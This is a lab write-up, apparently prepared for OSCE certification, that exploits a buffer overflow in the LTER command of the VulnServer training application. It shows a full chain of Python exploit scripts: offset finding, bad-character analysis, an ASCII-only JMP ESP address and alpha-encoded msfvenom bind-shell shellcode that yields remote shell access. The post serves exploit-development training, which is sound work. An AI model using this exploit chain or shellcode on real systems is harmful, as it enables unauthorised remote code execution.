---
layout: post
title:  "[VulnServer] Exploiting LTER Command using Restricted Characters"
date:   2018-06-30
categories: [exploitdev, osceprep]
---

The following skeleton was used for the exploitation of the `LTER` command.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Sending this code caused the application to crash.
![Crash](/static/img/06/01.png)

I ran `!mona pc 3000` to generate a unique string of 3000 bytes.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Using `!mona findmsp`, that offset was identified at **2003 bytes**.
![Offset](/static/img/06/02.png)

The code was modified to make sure that the offset was correct.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*2003
buffer += "BBBB"
buffer += "C"*(3000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen, the offset was correct and 4 B’s overwrote **EIP**. It can also be seen that **ESP** was located directly after **EIP** and pointed to the buffer of C’s.
![BBB](/static/img/06/03.png)

To find the bad characters, I modified the following code and stored it right after the 4 B’s.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*2003
buffer += "BBBB"
buffer += badchars
buffer += "C"*(3000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen here, right after `\x7F`, the character `\x80` was translated to `\x01`. It turned out that every character after `\x7F` will be converted by subtracting `\x7F`. In the case of `\xFF`, it was converted to `\x80` due to the minus `\x7F`. From that, I observed that the allowed characters were only ASCII (except of **NULL byte**). 
![ASCII](/static/img/06/04.png)

With that, I used `!mona jmp -r esp -cp ascii -m "essfunc.dll”` to find an address containing an `JMP ESP` instruction. Take note of the option `-cp ascii`. This was used to make sure that the resulting address(es) only contains ASCII characters. For this, I used the firsts instance which was `0x62501203`.
![JMP ESP](/static/img/06/05.png)

I then modifie the code and tried the `JMP ESP` address.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*2003
buffer += "\x03\x12\x50\x62"        # JMP ESP from essfunc.dll (ascii only)
buffer += "C"*(3000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen, it worked and I was redirected to the buffer of C’s.
![CCCC](/static/img/06/06.png)

Next, I generated a shellcode using the **alpha_mixed** encoder. I had to use this encoder to generate a shellcode that would contain only the list of allowed characters. It should be noted also that I used the option `BufferRegister=ESP`. Without this option, the shellcode will begin with the opcodes `\x89\xe2\xdb\xdb\xd9\x72`. This opcodes are needed in order to find the shellcode’s absolute location in memory. In this exploit, I already knew the absolute location of my shellcode, which was in **ESP**. With that, I opted to use the `BufferRegister=ESP` option when I generated my shellcode. If you want to learn more about the **alpha_mixed** encoder, please read [this](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/).
![MSFvenom](/static/img/06/07.png)

The following shows the final exploit code.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -e x86/alpha_mixed -b "\x00" BufferRegister=ESP -f c
# Payload size: 710 bytes
shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x4d\x38\x6c\x42\x33\x30"
"\x33\x30\x43\x30\x43\x50\x4e\x69\x58\x65\x54\x71\x6b\x70\x33"
"\x54\x4c\x4b\x52\x70\x54\x70\x4c\x4b\x71\x42\x36\x6c\x4e\x6b"
"\x50\x52\x62\x34\x6c\x4b\x64\x32\x51\x38\x54\x4f\x4e\x57\x42"
"\x6a\x45\x76\x34\x71\x39\x6f\x6e\x4c\x35\x6c\x45\x31\x53\x4c"
"\x54\x42\x76\x4c\x47\x50\x49\x51\x78\x4f\x74\x4d\x57\x71\x6b"
"\x77\x68\x62\x59\x62\x53\x62\x66\x37\x4c\x4b\x73\x62\x52\x30"
"\x6e\x6b\x63\x7a\x75\x6c\x4c\x4b\x52\x6c\x46\x71\x33\x48\x38"
"\x63\x42\x68\x77\x71\x38\x51\x30\x51\x6e\x6b\x32\x79\x67\x50"
"\x33\x31\x38\x53\x6c\x4b\x51\x59\x42\x38\x6d\x33\x76\x5a\x70"
"\x49\x4e\x6b\x37\x44\x6e\x6b\x77\x71\x6a\x76\x64\x71\x39\x6f"
"\x6e\x4c\x79\x51\x38\x4f\x46\x6d\x65\x51\x4a\x67\x34\x78\x69"
"\x70\x30\x75\x68\x76\x56\x63\x33\x4d\x58\x78\x45\x6b\x51\x6d"
"\x67\x54\x73\x45\x48\x64\x73\x68\x4c\x4b\x36\x38\x54\x64\x55"
"\x51\x6b\x63\x50\x66\x4c\x4b\x44\x4c\x52\x6b\x6c\x4b\x76\x38"
"\x67\x6c\x77\x71\x5a\x73\x4c\x4b\x63\x34\x6c\x4b\x66\x61\x38"
"\x50\x6e\x69\x47\x34\x66\x44\x57\x54\x31\x4b\x43\x6b\x65\x31"
"\x33\x69\x62\x7a\x52\x71\x49\x6f\x49\x70\x71\x4f\x71\x4f\x51"
"\x4a\x4c\x4b\x45\x42\x78\x6b\x6e\x6d\x71\x4d\x61\x78\x34\x73"
"\x74\x72\x55\x50\x55\x50\x42\x48\x42\x57\x54\x33\x44\x72\x31"
"\x4f\x76\x34\x65\x38\x42\x6c\x74\x37\x56\x46\x36\x67\x59\x6f"
"\x78\x55\x78\x38\x6a\x30\x63\x31\x67\x70\x33\x30\x44\x69\x78"
"\x44\x72\x74\x66\x30\x42\x48\x56\x49\x4b\x30\x42\x4b\x53\x30"
"\x4b\x4f\x79\x45\x32\x4a\x75\x58\x30\x59\x62\x70\x6a\x42\x6b"
"\x4d\x57\x30\x56\x30\x53\x70\x52\x70\x61\x78\x79\x7a\x46\x6f"
"\x49\x4f\x39\x70\x6b\x4f\x6e\x35\x6d\x47\x62\x48\x57\x72\x73"
"\x30\x57\x61\x53\x6c\x6e\x69\x7a\x46\x70\x6a\x64\x50\x73\x66"
"\x52\x77\x33\x58\x39\x52\x49\x4b\x37\x47\x63\x57\x49\x6f\x59"
"\x45\x62\x77\x71\x78\x58\x37\x6a\x49\x34\x78\x59\x6f\x4b\x4f"
"\x39\x45\x50\x57\x43\x58\x43\x44\x68\x6c\x67\x4b\x48\x61\x49"
"\x6f\x4b\x65\x76\x37\x6e\x77\x72\x48\x34\x35\x42\x4e\x70\x4d"
"\x73\x51\x49\x6f\x4e\x35\x53\x58\x32\x43\x52\x4d\x45\x34\x53"
"\x30\x6e\x69\x6b\x53\x72\x77\x50\x57\x53\x67\x44\x71\x49\x66"
"\x43\x5a\x52\x32\x72\x79\x53\x66\x78\x62\x59\x6d\x30\x66\x79"
"\x57\x73\x74\x64\x64\x57\x4c\x65\x51\x57\x71\x4c\x4d\x73\x74"
"\x61\x34\x64\x50\x69\x56\x53\x30\x32\x64\x66\x34\x56\x30\x36"
"\x36\x66\x36\x43\x66\x72\x66\x46\x36\x72\x6e\x66\x36\x31\x46"
"\x33\x63\x30\x56\x30\x68\x71\x69\x58\x4c\x45\x6f\x4f\x76\x59"
"\x6f\x4a\x75\x4f\x79\x6d\x30\x50\x4e\x51\x46\x53\x76\x6b\x4f"
"\x54\x70\x53\x58\x64\x48\x4f\x77\x67\x6d\x31\x70\x39\x6f\x69"
"\x45\x4d\x6b\x59\x70\x55\x4d\x54\x6a\x46\x6a\x65\x38\x4d\x76"
"\x7a\x35\x4d\x6d\x6f\x6d\x6b\x4f\x68\x55\x35\x6c\x54\x46\x31"
"\x6c\x67\x7a\x6b\x30\x39\x6b\x39\x70\x43\x45\x63\x35\x6d\x6b"
"\x72\x67\x56\x73\x73\x42\x70\x6f\x62\x4a\x43\x30\x42\x73\x6b"
"\x4f\x4a\x75\x41\x41")

buffer = "A"*2003
buffer += "\x03\x12\x50\x62"        # JMP ESP from essfunc.dll (ascii only)
buffer += shellcode
buffer += "C"*(3000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()
```

Running this caused the target machine to spawn a bind shell on port **4444/tcp**.
![Spawn](/static/img/06/08.png)

Connecting to this port allowed me to have shell access on the target machine.
![Shell](/static/img/06/09.png)
